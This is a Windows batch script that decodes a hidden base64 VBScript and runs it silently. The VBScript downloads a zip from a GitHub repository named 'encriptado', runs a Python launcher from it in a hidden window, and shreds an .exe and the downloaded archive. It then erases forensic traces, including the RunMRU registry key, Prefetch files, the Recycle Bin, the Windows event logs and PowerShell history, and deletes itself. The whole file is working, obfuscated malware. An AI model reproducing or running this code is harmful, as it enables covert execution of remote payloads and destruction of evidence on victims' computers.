@echo off
setlocal enabledelayedexpansion

if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vbsfile=%TEMP%\~init!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKCnNjcmlwdFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNjcmlwdE5hbWUgPSBmc28uR2V0RmlsZU5hbWUoc2NyaXB0UGF0aCkKc2NyaXB0RGlyID0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoc2NyaXB0UGF0aCkKdGVtcEJhc2UgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCgpJZiBJblN0cihMQ2FzZShzY3JpcHRQYXRoKSwgTENhc2UodGVtcEJhc2UpKSA+IDAgQW5kIExDYXNlKHNjcmlwdE5hbWUpID0gImNvcmUudmJzIiBUaGVuCiAgICBleGVQYXRoID0gIiIKICAgIEZvciBFYWNoIGYgSW4gZnNvLkdldEZvbGRlcihzY3JpcHREaXIpLkZpbGVzCiAgICAgICAgSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgogICAgICAgICAgICBleGVQYXRoID0gZi5QYXRoCiAgICAgICAgICAgIEV4aXQgRm9yCiAgICAgICAgRW5kIElmCiAgICBOZXh0CiAgICAKICAgIHJlcG9VUkwgPSAiaHR0cHM6Ly9naXRodWIuY29tL2JyYXlhbmpob2FuY2UyLWNvbGxhYi9lbmNyaXB0YWRvL2FyY2hpdmUvcmVmcy9oZWFkcy9tYWluLnppcCIKICAgIHppcFBhdGggPSBzY3JpcHREaXIgJiAiXHJlcG8uemlwIgogICAgZXh0cmFjdFBhdGggPSBzY3JpcHREaXIgJiAiXGV4dHJhY3RlZCIKICAgIAogICAgcHNEb3dubG9hZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwogICAgIltOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTI7ICIgJiBfCiAgICAiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KICAgICJ0cnkgeyAiICYgXwogICAgIiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICciICYgcmVwb1VSTCAmICInIC1PdXRGaWxlICciICYgemlwUGF0aCAmICInIC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwOyAiICYgXwogICAgIiAgICBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAnIiAmIHppcFBhdGggJiAiJyAtRGVzdGluYXRpb25QYXRoICciICYgZXh0cmFjdFBhdGggJiAiJyAtRm9yY2UgIiAmIF8KICAgICJ9IGNhdGNoIHsgZXhpdCAxIH0gIiAmIF8KICAgICIiIiIKICAgIAogICAgc2hlbGwuUnVuIHBzRG93bmxvYWQsIDAsIFRydWUKICAgIFdTY3JpcHQuU2xlZXAgODAwMAogICAgCiAgICBJZiBOb3QgZnNvLkZpbGVFeGlzdHMoemlwUGF0aCkgVGhlbgogICAgICAgIFdTY3JpcHQuUXVpdAogICAgRW5kIElmCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgCiAgICByZXBvUGF0aCA9ICIiCiAgICBsYXVuY2hlclBhdGggPSAiIgogICAgcHl0aG9uUGF0aCA9ICIiCiAgICAKICAgIElmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KICAgICAgICBGb3IgRWFjaCBzdWJmb2xkZXIgSW4gZnNvLkdldEZvbGRlcihleHRyYWN0UGF0aCkuU3ViRm9sZGVycwogICAgICAgICAgICBJZiBMQ2FzZShzdWJmb2xkZXIuTmFtZSkgPSAiZW5jcmlwdGFkby1tYWluIiBUaGVuCiAgICAgICAgICAgICAgICByZXBvUGF0aCA9IHN1YmZvbGRlci5QYXRoCiAgICAgICAgICAgICAgICBsYXVuY2hlclBhdGggPSByZXBvUGF0aCAmICJcbGF1bmNoZXIucHkiCiAgICAgICAgICAgICAgICBweXRob25QYXRoID0gcmVwb1BhdGggJiAiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgogICAgICAgICAgICAgICAgRXhpdCBGb3IKICAgICAgICAgICAgRW5kIElmCiAgICAgICAgTmV4dAogICAgRW5kIElmCiAgICAKICAgIElmIHJlcG9QYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhsYXVuY2hlclBhdGgpIEFuZCBmc28uRmlsZUV4aXN0cyhweXRob25QYXRoKSBUaGVuCiAgICAgICAgc2hlbGwuQ3VycmVudERpcmVjdG9yeSA9IHJlcG9QYXRoCiAgICAgICAgY21kTGF1bmNoID0gIiIiIiAmIHB5dGhvblBhdGggJiAiIiIgIiIiICYgbGF1bmNoZXJQYXRoICYgIiIiIgogICAgICAgIHNoZWxsLlJ1biBjbWRMYXVuY2gsIDAsIEZhbHNlCiAgICAgICAgV1NjcmlwdC5TbGVlcCAxMDAwMAogICAgRW5kIElmCiAgICAKICAgIElmIGV4ZVBhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGV4ZVBhdGgpIFRoZW4KICAgICAgICBGb3IgaSA9IDEgVG8gMwogICAgICAgICAgICBTZXQgZncgPSBmc28uT3BlblRleHRGaWxlKGV4ZVBhdGgsIDIpCiAgICAgICAgICAgIEZvciBqID0gMSBUbyAxMDAwCiAgICAgICAgICAgICAgICBmdy5Xcml0ZUxpbmUgU3RyaW5nKDgwLCBDaHIoSW50KFJuZCAqIDI2KSArIDY1KSkKICAgICAgICAgICAgTmV4dAogICAgICAgICAgICBmdy5DbG9zZQogICAgICAgICAgICBXU2NyaXB0LlNsZWVwIDIwMAogICAgICAgIE5leHQKICAgICAgICBmc28uRGVsZXRlRmlsZSBleGVQYXRoLCBUcnVlCiAgICBFbmQgSWYKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICAKICAgIElmIGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KICAgICAgICB6aXBTaXplID0gZnNvLkdldEZpbGUoemlwUGF0aCkuU2l6ZQogICAgICAgIElmIHppcFNpemUgPiAwIEFuZCB6aXBTaXplIDwgMTAwMDAwMDAwIFRoZW4KICAgICAgICAgICAgRm9yIHBhc3MgPSAxIFRvIDMKICAgICAgICAgICAgICAgIHBzU2hyZWQgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIgJiBfCiAgICAgICAgICAgICAgICAiJGJ5dGVzID0gTmV3LU9iamVjdCBieXRlW10gIiAmIHppcFNpemUgJiAiOyAiICYgXwogICAgICAgICAgICAgICAgIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRieXRlcyk7ICIgJiBfCiAgICAgICAgICAgICAgICAiW0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCciICYgemlwUGF0aCAmICInLCAkYnl0ZXMpICIgJiBfCiAgICAgICAgICAgICAgICAiIiIiCiAgICAgICAgICAgICAgICBzaGVsbC5SdW4gcHNTaHJlZCwgMCwgVHJ1ZQogICAgICAgICAgICAgICAgV1NjcmlwdC5TbGVlcCA1MDAKICAgICAgICAgICAgTmV4dAogICAgICAgIEVuZCBJZgogICAgICAgIGZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKICAgIEVuZCBJZgogICAgCiAgICBzaGVsbC5SZWdEZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVXCIKICAgIAogICAgcHNDbGVhciA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICIiIiAmIF8KICAgICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAiICYgXwogICAgIlJlbW92ZS1JdGVtICdDOlxXaW5kb3dzXFByZWZldGNoXCoucGYnIC1Gb3JjZTsgIiAmIF8KICAgICJDbGVhci1SZWN5Y2xlQmluIC1Gb3JjZSAtQ29uZmlybTokZmFsc2U7ICIgJiBfCiAgICAid2V2dHV0aWwgY2wgQXBwbGljYXRpb24gMj4kbnVsbDsgIiAmIF8KICAgICJ3ZXZ0dXRpbCBjbCBTeXN0ZW0gMj4kbnVsbDsgIiAmIF8KICAgICJSZW1vdmUtSXRlbSAnJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcUFNSZWFkTGluZVxDb25zb2xlSG9zdF9oaXN0b3J5LnR4dCcgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlICIgJiBfCiAgICAiIiIiCiAgICBzaGVsbC5SdW4gcHNDbGVhciwgMCwgVHJ1ZQogICAgCiAgICBXU2NyaXB0LlNsZWVwIDIwMDAKICAgIGNsZWFudXBCYXQgPSBzY3JpcHREaXIgJiAiXGNsZWFudXAuYmF0IgogICAgU2V0IGZjID0gZnNvLkNyZWF0ZVRleHRGaWxlKGNsZWFudXBCYXQsIFRydWUpCiAgICBmYy5Xcml0ZUxpbmUgIkBlY2hvIG9mZiIKICAgIGZjLldyaXRlTGluZSAidGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwiCiAgICBmYy5Xcml0ZUxpbmUgInRhc2traWxsIC9mIC9pbSB3c2NyaXB0LmV4ZSA+bnVsIDI+JjEiCiAgICBmYy5Xcml0ZUxpbmUgImRlbCAvZiAvcSAiIiIgJiBzY3JpcHRQYXRoICYgIiIiID5udWwgMj4mMSIKICAgIGZjLldyaXRlTGluZSAiY2QgL2QgJVRFTVAlIgogICAgZmMuV3JpdGVMaW5lICJybWRpciAvcyAvcSAiIiIgJiBzY3JpcHREaXIgJiAiIiIgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICIoZ290bykgMj5udWwgJiBkZWwgL2YgL3EgIiIlfn4wIiIgJiBleGl0IgogICAgZmMuQ2xvc2UKICAgIAogICAgc2hlbGwuUnVuICJjbWQuZXhlIC9jICIiIiAmIGNsZWFudXBCYXQgJiAiIiIiLCAwLCBGYWxzZQogICAgV1NjcmlwdC5RdWl0CiAgICAKRWxzZQogICAgdGVtcElEID0gInN5c18iICYgSW50KFJuZCAqIDk5OTk5OSArIDEwMDAwMCkKICAgIHRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKICAgIGZzby5DcmVhdGVGb2xkZXIgdGVtcFdvcmsKICAgIAogICAgdmJzVGVtcCA9IHRlbXBXb3JrICYgIlxjb3JlLnZicyIKICAgIGZzby5Db3B5RmlsZSBzY3JpcHRQYXRoLCB2YnNUZW1wLCBUcnVlCiAgICAKICAgIHNoZWxsLlJ1biAid3NjcmlwdC5leGUgIiIiICYgdmJzVGVtcCAmICIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQogICAgV1NjcmlwdC5TbGVlcCAxMDAwCiAgICAKICAgIGZzby5EZWxldGVGaWxlIHNjcmlwdFBhdGgsIFRydWUKICAgIFdTY3JpcHQuUXVpdAogICAgCkVuZCBJZg=='; ^
$bytes = [Convert]::FromBase64String($b64); ^
[IO.File]::WriteAllBytes('%vbsfile%', $bytes)"

timeout /t 2 /nobreak >nul

if exist "%vbsfile%" (
    start /b wscript.exe "%vbsfile%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit